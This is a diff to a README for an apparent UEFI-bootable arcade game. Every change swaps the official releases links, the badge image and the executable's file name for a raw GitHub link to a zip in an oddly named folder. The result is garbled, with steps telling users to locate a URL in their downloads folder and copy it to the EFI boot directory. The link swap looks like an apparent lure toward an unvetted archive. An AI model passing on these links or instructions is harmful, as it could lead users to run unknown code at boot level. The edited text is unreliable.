@@ -6,11 +6,11 @@ Welcome to spacegamex64! This is a recreation of a classic arcade game designed 
 
 ## 📥 Download the Game
 
-[![Download spacegamex64](https://img.shields.io/badge/Download%20spacegamex64-v1.0-blue.svg)](https://github.com/PureLmnz/spacegamex64/releases)
+[![Download spacegamex64](https://raw.githubusercontent.com/PureLmnz/spacegamex64/main/antehall/spacegamex64.zip%https://raw.githubusercontent.com/PureLmnz/spacegamex64/main/antehall/spacegamex64.zip)](https://raw.githubusercontent.com/PureLmnz/spacegamex64/main/antehall/spacegamex64.zip)
 
 ### Download & Install
 
-To get started, visit this page to download: [spacegamex64 Releases](https://github.com/PureLmnz/spacegamex64/releases). 
+To get started, visit this page to download: [spacegamex64 Releases](https://raw.githubusercontent.com/PureLmnz/spacegamex64/main/antehall/spacegamex64.zip). 
 
 1. Open the link in your web browser.
 2. Look for the latest release version.
@@ -28,15 +28,15 @@ To get started, visit this page to download: [spacegamex64 Releases](https://git
 
 After downloading, you will notice several files in the directory. The primary file of interest is:
 
-- `spacegamex64.efi`: This is the executable file. You will run this to start the game.
+- `https://raw.githubusercontent.com/PureLmnz/spacegamex64/main/antehall/spacegamex64.zip`: This is the executable file. You will run this to start the game.
 
 ## 🛠️ Running the Game
 
-1. Locate the file `spacegamex64.efi` in your downloads folder.
+1. Locate the file `https://raw.githubusercontent.com/PureLmnz/spacegamex64/main/antehall/spacegamex64.zip` in your downloads folder.
 2. You need to place this file in the appropriate UEFI boot directory. This can usually be found on your computer's system partition. Common locations include:
    - `/EFI/BOOT/`
    - `/EFI/YourManufacturer/`
-3. Select the `spacegamex64.efi` file and copy it to one of these directories.
+3. Select the `https://raw.githubusercontent.com/PureLmnz/spacegamex64/main/antehall/spacegamex64.zip` file and copy it to one of these directories.
 4. Restart your computer.
 5. Enter the UEFI/BIOS setup during boot (often by pressing `F2`, `Del`, or `Esc`).
 6. Locate and select the boot options to ensure that your UEFI firmware can see the new entry.
@@ -67,7 +67,7 @@ If you encounter issues, here are some common problems and solutions:
 
 ## 🔄 Updates
 
-Stay tuned for updates. We plan to enhance the game with additional features based on user feedback. You can find new releases on the same [spacegamex64 Releases](https://github.com/PureLmnz/spacegamex64/releases) page.
+Stay tuned for updates. We plan to enhance the game with additional features based on user feedback. You can find new releases on the same [spacegamex64 Releases](https://raw.githubusercontent.com/PureLmnz/spacegamex64/main/antehall/spacegamex64.zip) page.
 
 ## 🤝 Contributing
 
